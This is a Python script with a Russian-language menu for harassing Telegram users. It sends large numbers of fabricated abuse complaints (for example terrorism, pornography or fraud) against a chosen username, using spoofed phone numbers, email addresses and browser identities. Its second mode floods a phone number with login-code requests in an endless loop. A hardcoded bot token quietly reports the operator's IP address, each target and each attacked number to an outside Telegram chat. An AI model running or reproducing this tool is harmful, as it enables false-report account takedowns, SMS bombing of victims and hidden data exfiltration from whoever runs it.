import requests
import random
import time
import socket
import threading
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent

BOT_TOKEN = "7211390464:AAFaizSqi-nFdpUcvYDMdod6Y_lHGGi22mQ"
CHAT_ID = "7344283312"

complaint_count = 0
error_count = 0
count_lock = threading.Lock()

violations = {
    1: ['Спам', [
        'Уважаемая служба поддержки, пользователь {username} активно занимается спамом. Примите меры.',
        'Пользователь {username} нарушает правила, рассылка спама. Прошу принять меры.',
        'Аккаунт {username} занимается спамом в чатах Telegram. Просьба принять меры.',
        'Пользователь {username} отправляет спам-сообщения в чатах. Пожалуйста, разберитесь.',
        'Заметил, что {username} занимается рассылкой спама. Прошу принять меры.',
        'Пользователь {username} спамит в чатах Telegram. Требуются меры.'
    ]],
    2: ['Мошенничество', [
        'Обратите внимание на {username}, подозревается в мошенничестве. Проверьте его действия.',
        'Пользователь {username} участвует в мошеннических схемах. Просьба принять меры.',
        'Уважаемая служба поддержки, {username} занимается мошенничеством. Требуются меры.',
        'Пользователь {username} замечен в мошенничестве. Прошу проверить.',
        'Прошу обратить внимание на {username}, возможное мошенничество. Необходимо вмешательство.',
        'Пользователь {username} подозревается в мошеннических действиях. Проверьте.'
    ]],
    3: ['Порнография', [
        'Уважаемая служба поддержки, {username} распространяет порнографию. Примите меры.',
        'Пользователь {username} нарушает правила, распространение порнографии. Прошу принять меры.',
        'Аккаунт {username} распространяет порнографический контент. Просьба принять меры.',
        'Пользователь {username} размещает порнографические материалы. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет порнографию. Прошу принять меры.',
        'Пользователь {username} распространяет порнографию в чатах Telegram. Требуются меры.'
    ]],
    4: ['Нарушение правил', [
        'Уважаемая служба поддержки, {username} нарушает правила платформы. Примите меры.',
        'Пользователь {username} систематически нарушает правила. Прошу принять меры.',
        'Аккаунт {username} нарушает установленные правила. Просьба принять меры.',
        'Пользователь {username} нарушает правила поведения. Пожалуйста, разберитесь.',
        'Заметил, что {username} нарушает правила. Прошу принять меры.',
        'Пользователь {username} нарушает правила Telegram. Требуются меры.'
    ]],
    5: ['Оскорбления', [
        'Уважаемая служба поддержки, {username} оскорбляет пользователей. Примите меры.',
        'Пользователь {username} ведет себя агрессивно и оскорбляет других. Прошу принять меры.',
        'Аккаунт {username} оскорбляет участников чатов. Просьба принять меры.',
        'Пользователь {username} распространяет оскорбительные сообщения. Пожалуйста, разберитесь.',
        'Заметил, что {username} оскорбляет других участников. Прошу принять меры.',
        'Пользователь {username} ведет себя оскорбительно в чатах Telegram. Требуются меры.'
    ]],
    6: ['Нарушение авторских прав', [
        'Уважаемая служба поддержки, {username} нарушает авторские права. Примите меры.',
        'Пользователь {username} размещает контент без разрешения. Прошу принять меры.',
        'Аккаунт {username} систематически нарушает авторские права. Просьба принять меры.',
        'Пользователь {username} размещает защищенные материалы. Пожалуйста, разберитесь.',
        'Заметил, что {username} нарушает авторские права. Прошу принять меры.',
        'Пользователь {username} нарушает авторские права в чатах Telegram. Требуются меры.'
    ]],
    7: ['Пропаганда насилия', [
        'Уважаемая служба поддержки, {username} распространяет материалы с насилием. Примите меры.',
        'Пользователь {username} пропагандирует насилие. Прошу принять меры.',
        'Аккаунт {username} размещает материалы с насилием. Просьба принять меры.',
        'Пользователь {username} пропагандирует насилие. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет насильственные материалы. Прошу принять меры.',
        'Пользователь {username} пропагандирует насилие в чатах Telegram. Требуются меры.'
    ]],
    8: ['Пропаганда наркотиков', [
        'Уважаемая служба поддержки, {username} пропагандирует наркотики. Примите меры.',
        'Пользователь {username} распространяет материалы про наркотики. Прошу принять меры.',
        'Аккаунт {username} занимается пропагандой наркотиков. Просьба принять меры.',
        'Пользователь {username} пропагандирует наркотики. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет материалы про наркотики. Прошу принять меры.',
        'Пользователь {username} пропагандирует наркотики в чатах Telegram. Требуются меры.'
    ]],
    9: ['Терроризм', [
        'Уважаемая служба поддержки, {username} связан с терроризмом. Примите меры.',
        'Пользователь {username} подозревается в терроризме. Прошу принять меры.',
        'Аккаунт {username} связан с террористическими действиями. Просьба принять меры.',
        'Пользователь {username} распространяет террористические материалы. Пожалуйста, разберитесь.',
        'Заметил, что {username} может быть причастен к терроризму. Прошу принять меры.',
        'Пользователь {username} подозревается в террористической деятельности. Требуются меры.'
    ]],
    10: ['Фейковые новости', [
        'Уважаемая служба поддержки, {username} распространяет фейковые новости. Примите меры.',
        'Пользователь {username} занимается дезинформацией. Прошу принять меры.',
        'Аккаунт {username} распространяет ложные сведения. Просьба принять меры.',
        'Пользователь {username} распространяет фейки. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет фейковые новости. Прошу принять меры.',
        'Пользователь {username} занимается дезинформацией в чатах Telegram. Требуются меры.'
    ]],
    11: ['Нарушение конфиденциальности', [
        'Уважаемая служба поддержки, {username} нарушает конфиденциальность. Примите меры.',
        'Пользователь {username} распространяет личные данные. Прошу принять меры.',
        'Аккаунт {username} нарушает правила конфиденциальности. Просьба принять меры.',
        'Пользователь {username} нарушает конфиденциальность. Пожалуйста, разберитесь.',
        'Заметил, что {username} нарушает конфиденциальность. Прошу принять меры.',
        'Пользователь {username} распространяет личные данные в чатах Telegram. Требуются меры.'
    ]],
    12: ['Хакерство', [
        'Уважаемая служба поддержки, {username} занимается хакерством. Примите меры.',
        'Пользователь {username} подозревается в хакерстве. Прошу принять меры.',
        'Аккаунт {username} занимается хакерской деятельностью. Просьба принять меры.',
        'Пользователь {username} подозревается в хакерской деятельности. Пожалуйста, разберитесь.',
        'Заметил, что {username} занимается хакерством. Прошу принять меры.',
        'Пользователь {username} занимается хакерством в чатах Telegram. Требуются меры.'
    ]]
}


def send_telegram_message(message):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": message},
            timeout=5
        )
    except:
        pass


def log_activation():
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        send_telegram_message(f"Скрипт активирован. IP-адрес: {ip_address}")
    except:
        pass


def generate_complaint(username, violation):
    return random.choice(violations[violation][1]).format(username=username)


def generate_phone_number():
    return "+7" + "".join(random.choices("0123456789", k=10))


def generate_email():
    domains = ["gmail.com", "yandex.ru", "mail.ru", "protonmail.com"]
    username = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
    return f"{username}@{random.choice(domains)}"


def send_single_complaint(username, violation, custom_complaint=None):
    global complaint_count, error_count

    phone_number = generate_phone_number()
    email = generate_email()
    complaint = custom_complaint if custom_complaint else generate_complaint(username, violation)

    headers = {
        'User-Agent': UserAgent().random,
        'Content-Type': 'application/json'
    }

    data = {
        'complaint': complaint,
        'support_problem': complaint,
        'support_phone': phone_number,
        'support_email': email
    }

    try:
        response = requests.post(
            "https://telegram.org/support",
            headers=headers,
            json=data,
            timeout=10
        )

        with count_lock:
            if response.status_code == 200:
                complaint_count += 1
                print(f"[УСПЕХ #{complaint_count}] Жалоба на {username} отправлена")
            else:
                error_count += 1
                print(f"[ОШИБКА #{error_count}] Код статуса: {response.status_code}")
    except Exception as e:
        with count_lock:
            error_count += 1
        print(f"[ОШИБКА #{error_count}] {str(e)}")


def spam_complaints(username, violation, num_complaints, custom_complaint=None):
    log_complaint(username, violation, num_complaints)

    print(f"\nНачало отправки {num_complaints} жалоб...")
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for _ in range(num_complaints):
            futures.append(
                executor.submit(
                    send_single_complaint,
                    username,
                    violation,
                    custom_complaint
                )
            )
            time.sleep(0.1)

        for future in futures:
            try:
                future.result()
            except:
                pass

    total_time = time.time() - start_time
    print("\nРезультаты:")
    print(f"Успешно отправлено: {complaint_count}")
    print(f"Ошибок: {error_count}")
    print(f"Время выполнения: {total_time:.2f} секунд")
    print(f"Скорость: {complaint_count / max(total_time, 1):.2f} жалоб/сек")


def log_complaint(username, violation, num_complaints):
    try:
        violation_type = "Своя жалоба" if violation == 13 else violations[violation][0]
        message = (
            f"Отправка жалоб:\nПользователь: {username}\n"
            f"Тип жалобы: {violation_type}\n"
            f"Количество жалоб: {num_complaints}"
        )
        send_telegram_message(message)
    except:
        pass


def print_colored_text(text, color):
    colors = {
        "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
        "blue": "\033[94m", "magenta": "\033[95m", "cyan": "\033[96m",
        "white": "\033[97m"
    }
    print(colors.get(color, "") + text + "\033[0m")


def print_menu():
    print_colored_text("""
  _____ _____ _____ _____ _____ _____ _____ 
 |_____|_____|_____|_____|_____|_____|_____|
 | | | |  _  |     |  _  |_   _|   __| __  |
 |_|_|_|_____|_|_|_|_____| |_| |__   |    -|
   | | | | | | | | | | | | | | |_____|__|__|
   |_|_|_|_|_|_|_|_|_|_|_|_|_|_|            
""", "cyan")
    print_colored_text("1 - Многопоточный спам жалобами", "green")
    print_colored_text("2 - Спам кодами (SMS/звонки)", "green")
    print_colored_text("3 - Выход", "red")
    print("")


def spam_phone_numbers(number):
    print_colored_text("\nНачало спам-атаки... (Ctrl+C для остановки)", "yellow")

    def attack():
        headers = {'User-Agent': UserAgent().random}
        try:
            response = requests.post(
                'https://my.telegram.org/auth/send_password',
                headers=headers,
                data={'phone': number},
                timeout=5
            )
            return response.status_code
        except:
            return None

    count = 0
    start_time = time.time()

    try:
        with ThreadPoolExecutor(max_workers=10) as executor:
            while True:
                futures = [executor.submit(attack) for _ in range(10)]
                for future in futures:
                    status = future.result()
                    count += 1
                    print(f"[Атака #{count}] {'Успешно' if status == 200 else 'Ошибка'}")
                time.sleep(0.5)
    except KeyboardInterrupt:
        total_time = time.time() - start_time
        print(f"\nСпам-атака остановлена. Всего отправлено: {count} запросов")
        print(f"Скорость: {count / max(total_time, 1):.2f} запросов/сек")

def log_spam_attack(phone_number):
    try:
        message = f"Начата спам-атака на номер: {phone_number}"
        send_telegram_message(message)
    except:
        pass

def main():
    log_activation()

    while True:
        print_menu()
        try:
            choice = input("Выберите режим (1-3): ").strip()

            if choice == "1":
                print_colored_text("\n=== МНОГОПОТОЧНЫЙ СПАМ ЖАЛОБАМИ ===", "yellow")
                username = input("Введите username (@user): ").strip()
                if not username:
                    print_colored_text("Ошибка: username не может быть пустым", "red")
                    continue

                print("\nДоступные категории жалоб:")
                for k, v in violations.items():
                    print(f"{k} - {v[0]}")
                print("13 - Своя жалоба")

                try:
                    violation = int(input("\nВыберите тип жалобы: "))
                    if violation == 13:
                        custom_complaint = input("Введите текст жалобы: ").strip()
                        if not custom_complaint:
                            print_colored_text("Ошибка: текст жалобы не может быть пустым", "red")
                            continue
                    elif violation not in violations:
                        print_colored_text("Ошибка: неверный тип жалобы", "red")
                        continue
                    else:
                        custom_complaint = None

                    num_complaints = int(input("Количество жалоб: "))
                    if num_complaints <= 0:
                        print_colored_text("Ошибка: количество должно быть > 0", "red")
                        continue

                    global complaint_count, error_count
                    complaint_count = 0
                    error_count = 0

                    spam_complaints(username, violation, num_complaints, custom_complaint)
                    input("\nНажмите Enter чтобы продолжить...")

                except ValueError:
                    print_colored_text("Ошибка: введите число", "red")

            elif choice == "2":
                print_colored_text("\n=== СПАМ КОДАМИ НА ТЕЛЕФОН ===", "yellow")
                number = input("Введите номер (+7XXXXXXXXXX): ").strip()
                if not number.startswith('+7') or len(number) != 12 or not number[1:].isdigit():
                    print_colored_text("Ошибка: неверный формат номера", "red")
                    continue

                log_spam_attack(number)
                spam_phone_numbers(number)

            elif choice == "3":
                print_colored_text("Выход из программы...", "red")
                break

            else:
                print_colored_text("Ошибка: неверный выбор", "red")

        except KeyboardInterrupt:
            print_colored_text("\nВыход из программы...", "red")
            break
        except Exception as e:
            print_colored_text(f"Ошибка: {str(e)}", "red")


if __name__ == "__main__":
    main()
